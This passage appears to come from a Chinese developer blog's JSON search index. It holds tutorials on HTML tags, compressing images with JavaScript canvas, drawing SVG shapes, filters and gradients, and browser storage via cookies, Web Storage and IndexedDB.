src=&quot;frame_b.htm&quot; /&gt; &lt;frame src=&quot;frame_c.htm&quot; /&gt;&lt;/frameset&gt; &lt;frame&gt; 标签定义 frameset 中的一个特定的窗口 frameset 标签 frameset 元素可定义一个框架集。它被用来组织多个窗口（框架）。每个框架存有独立的文档 cols 定义框架集中列的数目和尺寸 rows 定义框架集中行的数目和尺寸 iframe 标签 iframe 元素会创建包含另外一个文档的内联框架（即行内框架） frameborder 规定是否显示框架周围的边框 height 规定iframe的高度 width 定义 iframe 的宽度 marginheight 定义 iframe 的顶部和底部的边距 marginwidth 定义 iframe 的左侧和右侧的边距 name 规定 iframe 的名称 scrolling yes/no/auto 规定是否在 iframe 中显示滚动条 src 规定在 iframe 中显示的文档的 URL img 标签 alt 规定图像的替代文本 src 规定显示图像的 URL height 定义图像的高度 width 设置图像的宽度 ismap 将图像定义为服务器端图像映射 usemap 将图像定义为客户器端图像映射 input 标签 accept 规定通过文件上传来提交的文件的类型 alt 定义图像输入的替代文本 autocomplete on/off 规定是否使用输入字段的自动完成功能 autofocus 规定输入字段在页面加载时是否获得焦点，（不适用于 type=”hidden”） checked 规定此 input 元素首次加载时应当被选中 disabled 当 input 元素加载时禁用此元素 form 规定输入字段所属的一个或多个表单 list 引用包含输入字段的预定义选项的 datalist max 规定输入字段的最大值 min 规定输入字段的最小值 maxlength 规定输入字段中的字符的最大长度 multiple 如果使用该属性，则允许一个以上的值 name 定义 input 元素的名称 pattern 规定输入字段的值的模式或格式，通常用于表单输入内容验证是否规则 placeholder 规定帮助用户填写输入字段的提示 readonly 规定输入字段为只读 required 指示输入字段的值是必需的 size 定义输入字段的宽度 src 定义以提交按钮形式显示的图像的 URL type button/checkbox/file/hidden/image/password/radio/reset/submit/text/tel/email/teatarea/radio 规定 input 元素的类型 keygen 标签 12345&lt;form action=&quot;demo_keygen.asp&quot; method=&quot;get&quot;&gt; Username: &lt;input type=&quot;text&quot; name=&quot;usr_name&quot; /&gt; Encryption: &lt;keygen name=&quot;security&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; &lt;keygen&gt; 标签规定用于表单的密钥对生成器字段。当提交表单时，私钥存储在本地，公钥发送到服务器 link 标签 &lt;link&gt; 标签定义文档与外部资源的关系 href 规定被链接文档的位置 rel alternate/author/elp/icon/licence/next/pingback/prefetch/prev/search/sidebar/stylesheet/tag 规定当前文档与被链接文档之间的关系 type 规定被链接文档的 MIME 类型 map 标签 12345&lt;map name=&quot;planetmap&quot; id=&quot;planetmap&quot;&gt; &lt;area shape=&quot;circle&quot; coords=&quot;180,139,14&quot; href =&quot;venus.html&quot; alt=&quot;Venus&quot; /&gt; &lt;area shape=&quot;circle&quot; coords=&quot;129,161,10&quot; href =&quot;mercur.html&quot; alt=&quot;Mercury&quot; /&gt; &lt;area shape=&quot;rect&quot; coords=&quot;0,0,110,260&quot; href =&quot;sun.html&quot; alt=&quot;Sun&quot; /&gt;&lt;/map&gt; 定义一个客户端图像映射。图像映射（image-map）指带有可点击区域的一幅图像。 area 元素永远嵌套在 map 元素内部。area 元素可定义图像映射中的区域 mark 标签 &lt;mark&gt; 标签定义带有记号的文本。请在需要突出显示文本时使用 &lt;m&gt;标签 meta 标签 &lt;meta&gt; 元素可提供有关页面的元信息（meta-information），比如针对搜索引擎和更新频度的描述和关键词,&lt;meta&gt; 标签位于文档的头部，不包含任何内容。&lt;meta&gt; 标签的属性定义了与文档相关联的名称/值对 content 定义与 http-equiv 或 name 属性相关的元信息 http-equiv content-type/expires/refresh/set-cookie 把 content 属性关联到 HTTP 头部 name author/description/keywords/generator/revised/others 把 content 属性关联到一个名称 scheme 定义用于翻译 content 属性值的格式 meter 标签 使用meter 元素来度量给定范围内的数据 1&lt;meter value=&quot;3&quot; min=&quot;0&quot; max=&quot;10&quot;&gt;十分之三&lt;/meter&gt; &lt;meter&gt; 标签定义已知范围或分数值内的标量测量。也被称为 gauge（尺度） object 标签 向 HTML 代码添加一个对象 1234567&lt;object classid=&quot;clsid:F08DF954-8592-11D1-B16A-00C0F0283628&quot; id=&quot;Slider1&quot; width=&quot;100&quot; height=&quot;50&quot;&gt; &lt;param name=&quot;BorderStyle&quot; value=&quot;1&quot; /&gt; &lt;param name=&quot;MousePointer&quot; value=&quot;0&quot; /&gt; &lt;param name=&quot;Enabled&quot; value=&quot;1&quot; /&gt; &lt;param name=&quot;Min&quot; value=&quot;0&quot; /&gt; &lt;param name=&quot;Max&quot; value=&quot;10&quot; /&gt;&lt;/object&gt;","tags":[{"name":"html","slug":"html","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/html/"},{"name":"function","slug":"function","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/function/"}]},{"title":"使用js压缩图片","date":"2020-08-10T02:17:32.000Z","path":"2020/08/10/js-image-compression/","text":"压缩图片的方式主要是使用了canvas进行了一次转码和压缩 使用的方法 var fr = FileReader() fr.readAsDataURL(file) Image() canvas.toDataURL(imgType, quality) FileReader() 函数 使用 12345var reader = new FileReader()reader.onload = function(e) &#123; console.log(e.target.result)&#125;reader.readAsText(file) 属性 error 返回读取文件时的错误信息 onabort 包含在终止事件被触发时执行的事件处理程序，举例，当读取文件的过程中需要中止时。 onload 当FileReader读取文件的方式为readAsArrayBuffer,readAsBinaryString, readAsDataURL 或者 readAsText 的时候，会触发一个 load 事件。从而可以使用 FileReader.onload 属性对该事件进行处理。 readyState 提供 FileReader 读取操作时的当前状态 result 返回文件的内容。只有在读取操作完成后，此属性才有效，返回的数据的格式取决于是使用哪种读取方法来执行读取操作的。 一个字符串或者一个ArrayBuffer ，这取决于读取操作是使用哪种方法来进行的 方法 abort() abort方法可以取消FileReader的读写操作，触发之后readyState为已完成(DONE) readAsArrayBuffer() FileReader 接口提供的readAsArrayBuffer 用于启动读取指定的Blob或者File的内容，当操作完成时，readyState变成done并且触发loadend事件，result属性中将包含一个ArrayBuffer对象表示所读取文件的数据 readAsBinaryString() readAsBinaryString 方法读取指定的blob或者File的内容，当操作完成时，readyState变成done并且触发loadend事件，result属性中将包含一个ArrayBuffer对象表示所读取文件原始二进制格式 该方法已从 FileAPI 标准移除，请使用 FileReader.readAsArrayBuffer() 代替。 readAsDataURL() readAsDataURL 方法会读取指定的 Blob 或 File 对象。读取操作完成的时候，readyState 会变成已完成DONE，并触发 loadend 事件，同时 result 属性将包含一个data:URL格式的字符串（base64编码）以表示所读取文件的内容 readAsText() readAsText 方法可以将 Blob 或者 File 对象转根据特殊的编码格式转化为内容(字符串形式) 这个方法是异步的，也就是说，只有当执行完成后才能够查看到结果，如果直接查看是无结果的，并返回undefined 必须要挂载 实例下的 onload 或 onloadend 的方法处理转化后的结果 转化完成后， readyState 这个参数就会转换 为 done 即完成态， event(“loadend”) 挂载的事件会被触发，并可以通过事件返回的形参得到中的 FileReader.result 属性得到转化后的结果 12// [encoding] 编码类型， 可选FileReader.readAsText(blob[, encoding]); 开始进行图片压缩 首先，创建一个input输入框用来上传文件 12&lt;input type=&quot;file&quot; multiple=&quot;&quot; id=&quot;file&quot; /&gt;&lt;input type=&quot;button&quot; value=&quot;提交&quot; onclick=&quot;handleChoose()&quot;&gt; 获取上传的文件 123456789101112131415161718192021222324252627282930const handleChoose = function() &#123; const file = Array.from(document.getElementById(&#x27;file&#x27;).files) const filePath = document.getElementById(&#x27;file&#x27;).value const imgBox = document.getElementById(&#x27;img&#x27;) const imgs = [] file.map(item =&gt; &#123; let reader = new FileReader() const img = document.createElement(&#x27;img&#x27;) // 将file文件 转码为base64 reader.readAsDataURL(item) // FileReader插件转码成功之后 reader.onload = function() &#123; img.src = reader[&#x27;result&#x27;] console.log(img.src, 123) const imgType = img.src.split(&#x27;;&#x27;)[0].split(&#x27;:&#x27;)[1] imgBox.appendChild(img) const callback = function(data) &#123; console.log(data, 456) &#125; scaleImage(img.src, imgType, callback) &#125; // FileReader插件转码失败 reader.onerror = function(e) &#123; console.log(e) &#125; // FileReader插件转码成功 reader.onloadend = function(e) &#123; &#125; &#125;)&#125; 进行图片压缩 123456789101112131415161718192021222324function scaleImage(base64Url, imgType, callback ) &#123; const img = new Image() img.src= base64Url img.onload = function() &#123; let _this = this let width = _this.width let height = _this.height let quality = 0.7 let canvas = document.createElement(&#x27;canvas&#x27;) let ctx = canvas.getContext(&#x27;2d&#x27;) let canvasW = document.createAttribute(&#x27;width&#x27;) let canvasH = document.createAttribute(&#x27;height&#x27;) canvasW.nodeValue = width canvasH.nodeValue = height canvas.setAttributeNode(canvasW) canvas.setAttributeNode(canvasH) ctx.drawImage(_this, 0, 0, width, height) let base64 = canvas.toDataURL(&quot;image/jpeg&quot;, quality) // toDataUrl // 图片格式默认为 image/png // 在指定格式为image/jpeg 或image.webp得情况下，可以从0,1的区间内压缩图片质量，如果超出取值范围，将会使用默认值0.92 callback(base64) &#125;&#125;","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"canvas","slug":"canvas","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/canvas/"}]},{"title":"Promise 源码解析","date":"2020-08-03T02:34:59.000Z","path":"2020/08/03/promise-source-code/","text":"","tags":[{"name":"promise","slug":"promise","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/promise/"}]},{"title":"矢量图形 SVG 学习之路 --- 进阶版","date":"2020-07-30T06:42:26.000Z","path":"2020/07/30/svg-study-02/","text":"SVG 滤镜 SVG可用的滤镜有以下几种 feBlend - 与图像相结合的滤镜 feColorMatrix - 用于彩色滤光片转换 feComponentTransfer feComposite feConvolveMatrix feDiffuseLighting feDisplacementMap feFlood feGaussianBlur feImage feMerge feMorphology feOffset - 过滤阴影 feSpecularLighting feTile feTurbulence feDistantLight - 用于照明过滤 fePointLight - 用于照明过滤 feSpotLight - 用于照明过滤 您可以在每个 SVG 元素上使用多个滤镜！ SVG 模糊效果 和 所有互联网的SVG滤镜定义在元素中。元素定义短并含有特殊元素（如滤镜）定义。 标签用来定义SVG滤镜。标签使用必需的id属性来定义向图形应用哪个滤镜？ 用于创建模糊效果 123456789&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt; &lt;defs&gt; &lt;filter id=&quot;f1&quot; x=&quot;0&quot; y=&quot;0&quot;&gt; &lt;feGaussianBlur in=&quot;SourceGraphic&quot; stdDeviation=&quot;15&quot; /&gt; &lt;/filter&gt; &lt;/defs&gt; &lt;rect width=&quot;90&quot; height=&quot;90&quot; stroke=&quot;green&quot; stroke-width=&quot;3&quot; fill=&quot;yellow&quot; filter=&quot;url(#f1)&quot; /&gt;&lt;/svg&gt; filter 元素id属性属性定义了一个滤镜的唯一名称 元素定义模糊效果 in=&quot;SourceGraphic&quot; 这个部分定义了由整个图像创建效果 stdDeviation 属性定义模糊量 元素的滤镜属性用来把元素链接到&quot;f1&quot;滤镜 SVG 阴影 和 所有互联网的SVG滤镜定义在元素中。元素定义短并含有特殊元素（如滤镜）定义。 标签用来定义SVG滤镜。标签使用必需的id属性来定义向图形应用哪个滤镜？ feOffset 元素是用于创建阴影效果。我们的想法是采取一个SVG图形（图像或元素）并移动它在xy平面上一点儿。 第一个例子偏移一个矩形（带），然后混合偏移图像顶部（含） 12345678910&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt; &lt;defs&gt; &lt;filter id=&quot;f1&quot; x=&quot;0&quot; y=&quot;0&quot; width=&quot;200%&quot; height=&quot;200%&quot;&gt; &lt;feOffset result=&quot;offOut&quot; in=&quot;SourceGraphic&quot; dx=&quot;20&quot; dy=&quot;20&quot; /&gt; &lt;feBlend in=&quot;SourceGraphic&quot; in2=&quot;offOut&quot; mode=&quot;normal&quot; /&gt; &lt;/filter&gt; &lt;/defs&gt; &lt;rect width=&quot;90&quot; height=&quot;90&quot; stroke=&quot;green&quot; stroke-width=&quot;3&quot; fill=&quot;yellow&quot; filter=&quot;url(#f1)&quot; /&gt;&lt;/svg&gt; feColorMatrix 的 matrix 是一个 4*5 的矩阵。前面 4 列是颜色通道的比例系数，最后一列是常量偏移。 上面公式中的 rr 表示 red to red 系数，以此类推。c1~c4 表示常量偏移。 第一个 4*5 矩阵为变换矩阵，第二个单列矩阵为待变换对象的像素值。右侧单列矩阵为矩阵 1 和 2 的点积结果。 这个变换矩阵看起来比较复杂，在实践上常使用一个简化的对角矩阵，即除了 rr/gg/bb/aa 取值非零外，其余行列取值为 0，这就退化成了简单的各颜色通道的独立调整。 feColorMatrix的语法: 上述feColorMatrix过滤器的类型值为matrix，除此之外，还有saturate（饱和度）和hueRotate（色相旋转），取值比较简单，这里不做说明。 显然当变换矩阵为单位对角矩阵时，变换结果和原值相等。 SVG渐变 渐变是从一种颜色到另一种颜色的平滑过渡，另外把多个元素的过渡应用到同一个元素上 渐变主要有两种类型 linear Redial SVG线性渐变 linearGradient 泳衣定义线性渐变 linearGradient必须套嵌在defs标签内部， 线性渐变可定义水平、垂直、或角渐变 当y1和y2相等 x1和x2不同时，可创建水平渐变 当x1和x2相等 y1和y2不同时，可创建垂直渐变 当x1和x2不同 y1和y2不同时，可创建角形渐变 123456789&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt; &lt;defs&gt; &lt;linearGradient id=&quot;grad1&quot; x1=&quot;0%&quot; y1=&quot;0%&quot; x2=&quot;100%&quot; y2=&quot;0%&quot;&gt; &lt;stop offset=&quot;0%&quot; style=&quot;stop-color:rgb(255,255,0);stop-opacity:1&quot; /&gt; &lt;stop offset=&quot;100%&quot; style=&quot;stop-color:rgb(255,0,0);stop-opacity:1&quot; /&gt; &lt;/linearGradient&gt; &lt;/defs&gt; &lt;ellipse cx=&quot;200&quot; cy=&quot;70&quot; rx=&quot;85&quot; ry=&quot;55&quot; fill=&quot;url(#grad1)&quot; /&gt;&lt;/svg&gt; linearGradient 标签的id属性可为渐变定义一个唯一的名称 linearGradient 标签的x1，y1，x2，y2属性自定义渐变开始和结束位置 渐变颜色范围可由两种或多种颜色组成，每种颜色通过一个stop标签来规定，offset属性用来定义渐变开始和结束位置 填充属性吧ellipse元素连接到次渐变 text 元素用来添加一个文本 SVG放射性渐变 redialGradient 元素用于定义放射性渐变 redialGradient 标签必须嵌套在defs的内部，defs标签是definitions的缩写，他可对诸如渐变之类的特殊元素进行定义 12345678910&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt; &lt;defs&gt; &lt;radialGradient id=&quot;grad1&quot; cx=&quot;50%&quot; cy=&quot;50%&quot; r=&quot;50%&quot; fx=&quot;50%&quot; fy=&quot;50%&quot;&gt; &lt;stop offset=&quot;0%&quot; style=&quot;stop-color:rgb(255,255,255); stop-opacity:0&quot; /&gt; &lt;stop offset=&quot;100%&quot; style=&quot;stop-color:rgb(0,0,255);stop-opacity:1&quot; /&gt; &lt;/radialGradient&gt; &lt;/defs&gt; &lt;ellipse cx=&quot;200&quot; cy=&quot;70&quot; rx=&quot;85&quot; ry=&quot;55&quot; fill=&quot;url(#grad1)&quot; /&gt;&lt;/svg&gt; redialGradient 标签的id属性可为渐变定义一个唯一的名称 cx、cy和r属性定义最外层圆，fx和fy定义最内层圆 渐变颜色返回可有两个或两个以上的颜色组成，每种颜色用一个stop标签指定，offset标签用于定义渐变色开始和结束的位置 填充属性把ellipse元素连接到渐变","tags":[{"name":"svg","slug":"svg","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/svg/"}]},{"title":"矢量图形 SVG 学习之路 --- 基础版","date":"2020-07-29T06:33:53.000Z","path":"2020/07/29/svg-study-01/","text":"SVG意为可缩放矢量图形（Scalable Vector Graphics） SVG使用XML格式定义图像 如何定义一个SVG图像 1234567891011121314151617&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;svg width=&quot;100%&quot; height=&quot;100%&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;path d=&quot;M200 200 C153 334 151 334 151 334 C151 339 153 344 156 344 C164 344 171 339 171 334 C171 322 164 314 156 314 C142 314 131 322 131 334 C131 350 142 364 156 364 C175 364 191 350 191 334 C191 311 175 294 156 294 C131 294 111 311 111 334 C111 361 131 384 156 384 C186 384 211 361 211 334 C211 300 186 274 156 274&quot; style=&quot;fill:white;stroke:red;stroke-width:2;&quot;&gt;&lt;/path&gt;&lt;/svg&gt; 在HTML页面中使用SVG 使用embed标签 标签被所有主流的浏览器支持，并允许使用脚本。 当在 HTML 页面中嵌入 SVG 时使用 标签是 Adobe SVG Viewer 推荐的方法！然而，如果需要创建合法的 XHTML，就不能使用 。任何 HTML 规范中都没有 标签。 1234&lt;embed src=&quot;rect.svg&quot; width=&quot;300&quot; height=&quot;100&quot; type=&quot;image/svg+xml&quot;pluginspage=&quot;http://www.adobe.com/svg/viewer/install/&quot; /&gt;&lt;!-- pluginspage 属性指向下载插件的 URL。 --&gt; 使用object标签 标签是 HTML 4 的标准标签，被所有较新的浏览器支持。它的缺点是不允许使用脚本。 假如您安装了最新版本的 Adobe SVG Viewer，那么当使用 标签时 SVG 文件无法工作（至少不能在 IE 中工作）！ 1234&lt;object data=&quot;rect.svg&quot; width=&quot;300&quot; height=&quot;100&quot; type=&quot;image/svg+xml&quot; codebase=&quot;http://www.adobe.com/svg/viewer/install/&quot; /&gt;&lt;!-- codebase 属性指向下载插件的 URL。 --&gt; 使用iframe标签 标签可工作在大部分的浏览器中 1&lt;iframe src=&quot;rect.svg&quot; width=&quot;300&quot; height=&quot;100&quot;&gt;&lt;/iframe&gt; SVG图像图形 svg矩形 svg圆形 svg椭圆 svg线 svg折线 svg多边形 svg路径 style 矩形样式 fill 定义矩形的填充颜色 stroke-width 矩形边框的宽度 stroke 矩形边框的颜色 fill-opacity 定义填充颜色透明度 合法范围 0 - 1 stroke-opacity 定义笔触颜色透明度 合法范围 0 - 1 SVG矩形 rect标签可以用来创建矩形，以及矩形的变种 1234567&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;svg width=&quot;100%&quot; height=&quot;100%&quot; version=&quot;1.1&quot;xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;rect width=&quot;300&quot; height=&quot;100&quot; style=&quot;fill:rgb(0,0,255);stroke-width:1; stroke:rgb(0,0,0)&quot;/&gt;&lt;/svg&gt; width 矩形的高度和宽度 height 矩形的宽度 x 定义矩形的左侧位置 y 定义矩形的右侧位置 rx ry 属性可使矩形产生圆角 SVG圆形 circle 标签可用来创建一个圆 1234&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt; &lt;circle cx=&quot;100&quot; cy=&quot;50&quot; r=&quot;40&quot; stroke=&quot;black&quot; stroke-width=&quot;2&quot; fill=&quot;red&quot;/&gt;&lt;/svg&gt; cx, cy 定义圆点的x和y坐标，如果省略cx和cy，圆的中心会被设置为（0,0） r 定义圆的半径 SVG椭圆 ellipse 标签用来创建一个椭圆 椭圆有不同的x和y半径，而圆的x和y的半径是相同的 12345&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt; &lt;ellipse cx=&quot;240&quot; cy=&quot;100&quot; rx=&quot;220&quot; ry=&quot;30&quot; style=&quot;fill:purple&quot;/&gt; &lt;ellipse cx=&quot;220&quot; cy=&quot;70&quot; rx=&quot;190&quot; ry=&quot;20&quot; style=&quot;fill:lime&quot;/&gt; &lt;ellipse cx=&quot;210&quot; cy=&quot;45&quot; rx=&quot;170&quot; ry=&quot;15&quot; style=&quot;fill:yellow&quot;/&gt;&lt;/svg&gt; cx 定义椭圆中心的x坐标 cy 定义椭圆中心的y坐标 rx 定义椭圆水平半径 ry 定义椭圆垂直半径 SVG直线 line 元素用来创建一个直线 1234&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt; &lt;line x1=&quot;0&quot; y1=&quot;0&quot; x2=&quot;200&quot; y2=&quot;200&quot; style=&quot;stroke:rgb(255,0,0);stroke-width:2&quot;/&gt;&lt;/svg&gt; x1 在x轴定义线条开始的地方 y1 在y轴定义线条开始的地方 x2 在x轴定义线条结束的地方 y2 在y轴定义线条结束的地方 SVG多边形 polyline 用来创建含有不少于三个边的图形，多边形是由直线组成的，其形状是封闭的 1234&lt;svg height=&quot;210&quot; width=&quot;500&quot;&gt; &lt;polygon points=&quot;200,10 250,190 160,210&quot; style=&quot;fill:lime;stroke:purple;stroke-width:1&quot;/&gt;&lt;/svg&gt; points 属性定义多边形的每个角的x和y坐标 fill-ruleSVG图片填充规则通过fill-rule来指定 fill-rule 用于指定使用哪一种算法去判断画布上的某区域是否属于该图形内部 nonzero 字面意思上是非零， 按照这个规则 要判断一个点是否在图形内，则从该点做任意方向的一条射线，然后检测射线与图形路径的交点情况，从零开始计数，如果从左向右穿过射线则计数加一，从右到左穿过射线则计数减1 如果结果为0则认为点在图形外部，否则认为在内部 evenodd 字面意思是“奇偶”。按该规则，要判断一个点是否在图形内，从该点作任意方向的一条射线，然后检测射线与图形路径的交点的数量。如果结果是奇数则认为点在内部，是偶数则认为点在外部。 SVG曲线 polyline 用于创建任何只有直线的形状 123456789&lt;!-- 折线型曲线 --&gt; &lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt; &lt;polyline points=&quot;20,20 40,25 60,40 80,120 120,140 200,180&quot; style=&quot;fill:none;stroke:black;stroke-width:3&quot; /&gt; &lt;/svg&gt;&lt;!-- 楼梯型曲线 --&gt; &lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt; &lt;polyline points=&quot;0,40 40,40 40,80 80,80 80,120 120,120 120,160&quot; style=&quot;fill:white;stroke:red;stroke-width:4&quot; /&gt; &lt;/svg&gt; SVG路径 path 元素用于定义一个路径 M = moveto 移动到 L = lineto 线路到 H = horizontal lineto 水平线到 V = vertical lineto 垂直线到 C = curveto 曲线 S = smooth curveto 平滑曲线 Q = quadratic Bézier curve 二次Bézier曲线 T = smooth quadratic Bézier curveto 光滑二次Bézier曲线 A = elliptical Arc 椭圆弧 Z = closepath 闭合路径 以上所有命令均允许小写字母。大写表示绝对定位，小写表示相对定位 1234567891011121314151617181920212223&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt; &lt;path id=&quot;lineAB&quot; d=&quot;M 100 350 l 150 -300&quot; stroke=&quot;red&quot; stroke-width=&quot;3&quot; fill=&quot;none&quot; /&gt; &lt;path id=&quot;lineBC&quot; d=&quot;M 250 50 l 150 300&quot; stroke=&quot;red&quot; stroke-width=&quot;3&quot; fill=&quot;none&quot; /&gt; &lt;path d=&quot;M 175 200 l 150 0&quot; stroke=&quot;green&quot; stroke-width=&quot;3&quot; fill=&quot;none&quot; /&gt; &lt;path d=&quot;M 100 350 q 150 -300 300 0&quot; stroke=&quot;blue&quot; stroke-width=&quot;5&quot; fill=&quot;none&quot; /&gt; &lt;!-- Mark relevant points --&gt; &lt;g stroke=&quot;black&quot; stroke-width=&quot;3&quot; fill=&quot;black&quot;&gt; &lt;circle id=&quot;pointA&quot; cx=&quot;100&quot; cy=&quot;350&quot; r=&quot;3&quot; /&gt; &lt;circle id=&quot;pointB&quot; cx=&quot;250&quot; cy=&quot;50&quot; r=&quot;3&quot; /&gt; &lt;circle id=&quot;pointC&quot; cx=&quot;400&quot; cy=&quot;350&quot; r=&quot;3&quot; /&gt; &lt;/g&gt; &lt;!-- Label the points --&gt; &lt;g font-size=&quot;30&quot; font=&quot;sans-serif&quot; fill=&quot;black&quot; stroke=&quot;none&quot; text-anchor=&quot;middle&quot;&gt; &lt;text x=&quot;100&quot; y=&quot;350&quot; dx=&quot;-30&quot;&gt;A&lt;/text&gt; &lt;text x=&quot;250&quot; y=&quot;50&quot; dy=&quot;-10&quot;&gt;B&lt;/text&gt; &lt;text x=&quot;400&quot; y=&quot;350&quot; dx=&quot;30&quot;&gt;C&lt;/text&gt; &lt;/g&gt;&lt;/svg&gt; SVG文本 text 用于定义文本 123&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt; &lt;text x=&quot;0&quot; y=&quot;15&quot; fill=&quot;red&quot;&gt;I love SVG&lt;/text&gt;&lt;/svg&gt; x 表示x轴的起始点 y 表示y轴的起始点 transform 动画 SVG 样式设置 Stroke 属性 stroke stroke 属性定义了一条线，文本或元素轮廓颜色 stroke-width 属性定义了线 文本或者元素轮廓的厚度 stroke-linecap 属性定义了不同类型的开放路径的终结 可选参数 butt,round,square 1234567&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt; &lt;g fill=&quot;none&quot; stroke=&quot;black&quot; stroke-width=&quot;6&quot;&gt; &lt;path stroke-linecap=&quot;butt&quot; d=&quot;M5 20 l215 0&quot; /&gt; &lt;path stroke-linecap=&quot;round&quot; d=&quot;M5 40 l215 0&quot; /&gt; &lt;path stroke-linecap=&quot;square&quot; d=&quot;M5 60 l215 0&quot; /&gt; &lt;/g&gt;&lt;/svg&gt; stroke-dasharray 用于创建虚线 12345678&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt; &lt;g fill=&quot;none&quot; stroke=&quot;black&quot; stroke-width=&quot;4&quot;&gt; &lt;path stroke-dasharray=&quot;5,5&quot; d=&quot;M5 20 l215 0&quot; /&gt; &lt;path stroke-dasharray=&quot;10,10&quot; d=&quot;M5 40 l215 0&quot; /&gt; &lt;path stroke-dasharray=&quot;20,10,5,5,5,10&quot; d=&quot;M5 60 l215 0&quot; /&gt; &lt;/g&gt;&lt;/svg&gt;&lt;!-- 注：stroke-dasharray: [实，虚，实，虚，实，虚，实，虚 ··· ···] --&gt;","tags":[{"name":"svg","slug":"svg","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/svg/"}]},{"title":"浏览器存储方式学习  cookie, session, localstorage, indexedDB","date":"2020-07-22T07:27:33.000Z","path":"2020/07/22/browser-storage-study/","text":"浏览器存储方式 cookie： cookie相当于客户端和服务器之间进行信息交互的一个标识，每次客户端访问服务器的时候都会携带上cookie，这样服务器就可以知道是谁来访问了。 Storage: Storage 是专门为浏览器存储提供的数据存储机制，分为localStorage和sessionStorage, 保存的数据以键值对的形式存在，并且以文本格式保存 indexedDB: indexedDB是运行在浏览器上的非关系型数据库, 一般来说是没有存储上限的, 不仅可以存储字符串, 还可以存储二进制数据 Cookie cookie的本职工作并非本地存储,而是维持状态，它是浏览器存储在用户机器上的一个小文本，大小不能超过4K cookie根据过期时间分为两类：会话cookie和持久cookie 会话cookie是一种临时cookie，当用户退出浏览器，会话cookie就会被删除 持久cookie则会存储在硬盘中，保存时间更长，浏览器关闭并不会删除cookie，通常持久性cookie会维护某一个用户周期性访问服务器配置文件或者登陆信息 访问方式 通过document.cookie来设置或获取cookie的值 产生Cookie的服务器可以向set-Coolie响应首部添加一个domain属性来控制那些站点可以看到这个cookie 1Set-Cookie:name=&quot;losstie&quot;domain=&quot;m.baidu.com&quot; 属性 path参数告诉浏览器cokie的路径，默认情况下，cookie属于当前页面 secure 设置里secure，cookie只有在https协议加密的情况下才会发送给服务端 HttpOnly 禁止javascript操作cookie（避免跨域脚本xss攻击，通过javascript的document.cookie 无法访问带有HttpOnly标记的cookie） 第三方cookie 第三方cookie就是cookie的域和地址栏中的域，这种cookie通常悲痛在第三方广告网站，用于跟踪用户的浏览记录，并根据手机的用户浏览习惯，给用户推送相关广告 劣势 cookie 存储信息少，不能超过4K，当cookie超过4KB是，会面临被裁剪的命运 每次请求都会携带在http头中，过量的cookie会损耗性能 cookie会紧跟域名，同一个域名下的所有请求都会携带cookie 不安全，服务器没法分辨用户和攻击者，攻击者可以读取网络上其他用户信息，包含HTTP Cookie的所有内容，以便进行中间攻击，使用跨站点脚本技术可以窃取cookie Web Storage localStorage localStorage是持久化的本地存储，存储在其中的数据永远不会过期，只能手动删除，遵循同源策略 sessionStorage sessionStorage是临时性的本地存储，会话级别，当页面或者会话结束时，存储内容也随之被释放，遵循同源策略，但是要保证在同一个窗口，否则无法共享内容 12345678910111213// localStorage保存数据：localStorage.setItem(key, value)读取数据：localStorage.getItem(key)移除数据：localStorage.removeItem(key)清除所有数据：localStorage.clear()得到某个索引的key：localStorage.key(index)// sessionStorage保存数据：sessionStorage.setItem(key, value)读取数据：sessionStorage.getItem(key)移除数据：sessionStorage.removeItem(key)清除所有数据：sessionStorage.clear()得到某个索引的key：sessionStorage.key(index) web storage 存储容量大，根据浏览器的不同，存储容量乐意达到5~10M之间 chrome，Firefox，edge都是5M，而且仅位于浏览器端，不与服务端发生通信 indexedDB indexedDB是一个运行在浏览器上的非关系型数据库，一般来说是没有存储上限的，不仅可以存储字符串，还可以存储二进制数据 indexedDB 允许存入大量数据，提供查找接口，还能建立索引，就数据库类型而言，indexedDB 不属于关系型数据库（不支持sql查询语句），更接近NoSQL数据 特点 键值对储存， indexedDB内部采用对象仓库（object store）存放数据 异步，indexedDb操作时不会锁死浏览器，用户依然可以进行其他操作 支持事务，只要有一步失败，整个事务就都取消，数据库回滚到事务发生之前的状态，不存在之改写一部分数据的情况 同源限制，每一个数据库对应创建他的域名，网页只能访问自身域名下的数据库，而不能访问跨域的数据库 存储空间大 支持二进制存储 操作 1234567891011// 建立打开 indexedDBwindow.indexedDB.open(&#x27;testDB&#x27;)// 关闭indexedDB indexdb.close()// 删除indexedDB indexedDB.deleteDatabase(indexdb) 基本概念 indexedDB是一个比较复杂的API,涉及不少概念，它把不同的实体，抽象成一个个对象接口 数据库 